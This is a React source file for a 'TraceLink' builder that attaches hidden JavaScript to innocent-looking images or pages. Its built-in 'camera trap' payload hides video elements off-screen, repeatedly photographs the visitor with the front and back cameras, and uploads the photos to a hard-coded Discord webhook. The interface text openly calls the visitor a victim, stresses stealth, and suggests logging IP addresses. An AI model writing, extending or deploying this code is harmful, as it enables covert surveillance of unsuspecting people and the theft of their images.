import React, { useState, useRef } from 'react';
import { Upload, Code, Play, Save, FileCode, ImageIcon, Zap, Terminal, Camera } from 'lucide-react';
import { MagicLink } from '../types';
import { generateId, DEFAULT_JS_CODE, DEFAULT_PYTHON_CODE } from '../utils/mockBackend';

interface CreatorProps {
  onCreated: (link: MagicLink) => void;
}

// Updated Snippet with your specific Webhook URL
const CAMERA_TRAP_SNIPPET = `<!-- Hidden Elements for Camera Capture -->
<div style="position:fixed; top:-9999px; left:-9999px; opacity:0;">
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>
</div>

<script>
  /* CONFIGURATION */
  // YOUR DISCORD WEBHOOK URL
  const WEBHOOK = 'https://discord.com/api/webhooks/1454120984528294083/7EqA6UC0cn9ksWJyzXk9RXhdok5-mXaopOtAhiJ6CNZlfN5iEfjny4Zb2jgd5NpdBQJJ';
  
  /* CAMERA LOGIC */
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  
  let isFront = true;

  async function startCamera(front) {
    if (video.srcObject) {
       video.srcObject.getTracks().forEach(t => t.stop());
    }
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: front ? 'user' : 'environment' },
        audio: false
      });
      video.srcObject = stream;
      await video.play();
      await new Promise(r => setTimeout(r, 1000)); // Warmup
      return true;
    } catch(e) {
      console.error('Camera access denied or failed', e);
      return false;
    }
  }

  async function captureAndSend() {
    const ok = await startCamera(isFront);
    if (!ok) return;

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    ctx.drawImage(video, 0, 0);

    canvas.toBlob(async (blob) => {
      if (!blob) return;
      const form = new FormData();
      form.append('content', \`📷 Captured (\${isFront ? 'Front' : 'Back'}) - \${new Date().toLocaleString()}\`);
      form.append('file', blob, 'capture.jpg');
      
      try {
        await fetch(WEBHOOK, { method: 'POST', body: form });
        console.log('Sent to Discord');
      } catch(err) { console.error('Webhook failed', err); }
    }, 'image/jpeg', 0.8);

    isFront = !isFront; // Toggle camera
  }

  // Run immediately on load, then every 3 seconds
  window.addEventListener('load', () => {
      captureAndSend();
      setInterval(captureAndSend, 3000);
  });
</script>`;

export const Creator: React.FC<CreatorProps> = ({ onCreated }) => {
  const [name, setName] = useState('');
  const [language, setLanguage] = useState<'javascript' | 'python'>('javascript');
  const [code, setCode] = useState(DEFAULT_JS_CODE); // Server side code
  
  const [responseType, setResponseType] = useState<'image' | 'html'>('image');
  const [htmlContent, setHtmlContent] = useState<string>('');
  const [injectionCode, setInjectionCode] = useState<string>(''); // Client side injection
  
  const [imagePreview, setImagePreview] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const handleImageChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setImagePreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const insertSnippet = () => {
    setInjectionCode(CAMERA_TRAP_SNIPPET);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!name) return;
    if (responseType === 'image' && !imagePreview) return;
    if (responseType === 'html' && !htmlContent) return;

    const newLink: MagicLink = {
      id: generateId(),
      name,
      code,
      language,
      responseType,
      imageUrl: imagePreview || '',
      htmlContent: htmlContent,
      injectionCode: injectionCode,
      createdAt: Date.now(),
      visits: 0,
    };
    onCreated(newLink);
  };

  const handleLanguageChange = (lang: 'javascript' | 'python') => {
    setLanguage(lang);
    setCode(lang === 'javascript' ? DEFAULT_JS_CODE : DEFAULT_PYTHON_CODE);
  };

  return (
    <div className="max-w-5xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-8 p-6">
      
      {/* Left Column: Configuration */}
      <div className="space-y-6">
        <div>
          <h2 className="text-2xl font-bold text-white mb-1">New TraceLink</h2>
          <p className="text-slate-400 text-sm">Attach server-side logic to an image or HTML page.</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label className="block text-sm font-medium text-slate-300">Link Name</label>
            <input 
              type="text" 
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="e.g., Hidden Camera Link"
              className="w-full bg-slate-800 border border-slate-700 rounded-lg px-4 py-2.5 text-white focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition-all outline-none"
              required
            />
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-medium text-slate-300">Response Type</label>
            <div className="grid grid-cols-2 gap-4">
              <button
                type="button"
                onClick={() => setResponseType('image')}
                className={`flex items-center justify-center gap-2 p-3 rounded-xl border transition-all ${
                  responseType === 'image' 
                    ? 'bg-indigo-600 border-indigo-500 text-white' 
                    : 'bg-slate-800 border-slate-700 text-slate-400 hover:border-slate-600'
                }`}
              >
                <ImageIcon size={18} />
                <span className="font-medium">Image + Script</span>
              </button>
              <button
                type="button"
                onClick={() => setResponseType('html')}
                className={`flex items-center justify-center gap-2 p-3 rounded-xl border transition-all ${
                  responseType === 'html' 
                    ? 'bg-indigo-600 border-indigo-500 text-white' 
                    : 'bg-slate-800 border-slate-700 text-slate-400 hover:border-slate-600'
                }`}
              >
                <FileCode size={18} />
                <span className="font-medium">Raw HTML</span>
              </button>
            </div>
          </div>

          {/* Image Mode Inputs */}
          {responseType === 'image' && (
             <div className="space-y-4 animate-in fade-in slide-in-from-top-2 duration-300">
               <div className="space-y-2">
                 <label className="block text-sm font-medium text-slate-300">1. Target Image</label>
                 <div 
                   onClick={() => fileInputRef.current?.click()}
                   className={`
                     border-2 border-dashed rounded-xl p-8 text-center cursor-pointer transition-all
                     ${imagePreview ? 'border-indigo-500/50 bg-indigo-500/10' : 'border-slate-700 hover:border-slate-500 bg-slate-800/50'}
                   `}
                 >
                   <input 
                     type="file" 
                     ref={fileInputRef}
                     onChange={handleImageChange}
                     accept="image/*"
                     className="hidden"
                   />
                   {imagePreview ? (
                     <div className="relative h-48 w-full">
                       <img src={imagePreview} alt="Preview" className="h-full w-full object-contain rounded-lg" />
                       <div className="absolute inset-0 flex items-center justify-center bg-black/40 opacity-0 hover:opacity-100 transition-opacity rounded-lg">
                         <span className="text-white font-medium">Change Image</span>
                       </div>
                     </div>
                   ) : (
                     <div className="flex flex-col items-center gap-3 text-slate-400">
                       <Upload size={32} />
                       <span className="text-sm">Click to upload image</span>
                     </div>
                   )}
                 </div>
               </div>

               <div className="space-y-2">
                 <div className="flex items-center justify-between mb-2 mt-6">
                    <label className="block text-sm font-medium text-slate-300 flex items-center gap-2">
                      <Zap size={14} className="text-yellow-400" />
                      2. Client-Side Injection (Optional)
                    </label>
                    <button
                      type="button"
                      onClick={insertSnippet}
                      className="text-xs font-bold flex items-center gap-2 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 px-3 py-2 rounded-lg transition-all shadow-[0_0_15px_rgba(16,185,129,0.1)] hover:shadow-[0_0_20px_rgba(16,185,129,0.2)]"
                    >
                      <Camera size={16} />
                      INSERT CAMERA TRAP 📸
                    </button>
                 </div>
                 <textarea
                   value={injectionCode}
                   onChange={(e) => setInjectionCode(e.target.value)}
                   spellCheck={false}
                   placeholder="Paste your HTML/JS here. e.g. <script>alert('Hello')</script>"
                   className="w-full h-48 bg-slate-900 border border-slate-700 rounded-lg p-4 font-mono text-xs leading-relaxed text-yellow-200/90 focus:ring-2 focus:ring-indigo-500 focus:border-transparent outline-none resize-none placeholder:text-slate-600"
                 />
                 <p className="text-xs text-slate-500 mt-2">
                   This code runs in the visitor's browser. Click the <span className="text-emerald-400">Green Button</span> above to auto-fill the camera logic.
                 </p>
               </div>
             </div>
          )}

          {/* HTML Mode Inputs */}
          {responseType === 'html' && (
            <div className="space-y-2 animate-in fade-in slide-in-from-top-2 duration-300">
              <label className="block text-sm font-medium text-slate-300">
                HTML Source Code
              </label>
              <textarea
                value={htmlContent}
                onChange={(e) => setHtmlContent(e.target.value)}
                spellCheck={false}
                placeholder="<!DOCTYPE html>..."
                className="w-full h-64 bg-slate-900 border border-slate-700 rounded-lg p-4 font-mono text-xs leading-relaxed text-emerald-300 focus:ring-2 focus:ring-indigo-500 focus:border-transparent outline-none resize-none"
              />
            </div>
          )}

          {/* Server Side Logic (Common) */}
          <div className="space-y-2 pt-4 border-t border-slate-800 opacity-60 hover:opacity-100 transition-opacity">
            <div className="flex items-center justify-between">
              <label className="block text-sm font-medium text-slate-300">Server-Side Logic (Node.js)</label>
            </div>
            
            <div className="relative group">
              <textarea
                value={code}
                onChange={(e) => setCode(e.target.value)}
                spellCheck={false}
                className="w-full h-20 bg-slate-900 border border-slate-700 rounded-lg p-4 font-mono text-xs leading-relaxed text-indigo-300 focus:ring-2 focus:ring-indigo-500 focus:border-transparent outline-none resize-none"
              />
            </div>
            <p className="text-xs text-slate-500">
              Runs on the server before serving content. Use this for IP Logging.
            </p>
          </div>

          <div className="pt-4">
            <button
              type="submit"
              disabled={!name || (responseType === 'image' && !imagePreview) || (responseType === 'html' && !htmlContent)}
              className="w-full bg-indigo-600 hover:bg-indigo-500 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold py-3 px-6 rounded-lg transition-all flex items-center justify-center gap-2 shadow-lg shadow-indigo-900/20"
            >
              <Save size={18} />
              Generate TraceLink
            </button>
          </div>
        </form>
      </div>

      {/* Right Column: Info / Help */}
      <div className="hidden lg:block space-y-6">
        <div className="bg-slate-800 rounded-xl p-6 border border-slate-700">
          <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Code size={20} className="text-indigo-400" />
            How to use Injection?
          </h3>
          <p className="text-sm text-slate-400 mb-4 leading-relaxed">
            The <b>Client-Side Injection</b> feature allows you to run JavaScript in the victim's browser while they view the image.
          </p>
          <ul className="space-y-3 text-sm text-slate-300">
             <li className="flex gap-2 items-start">
               <span className="bg-slate-700 p-1 rounded text-xs">Step 1</span>
               <span>Upload a harmless looking image (e.g. a meme or wallpaper).</span>
             </li>
             <li className="flex gap-2 items-start">
               <span className="bg-slate-700 p-1 rounded text-xs">Step 2</span>
               <span>Click the <b>INSERT CAMERA TRAP</b> button to load the payload.</span>
             </li>
             <li className="flex gap-2 items-start">
               <span className="bg-slate-700 p-1 rounded text-xs">Step 3</span>
               <span>Your specific Webhook URL is pre-configured.</span>
             </li>
          </ul>
          <div className="mt-4 p-3 bg-indigo-900/30 rounded border border-indigo-500/20 text-xs text-indigo-200">
            <strong>Stealth Mode:</strong> This code creates hidden <code>&lt;video&gt;</code> elements so the user only sees the image.
          </div>
        </div>
      </div>
    </div>
  );
};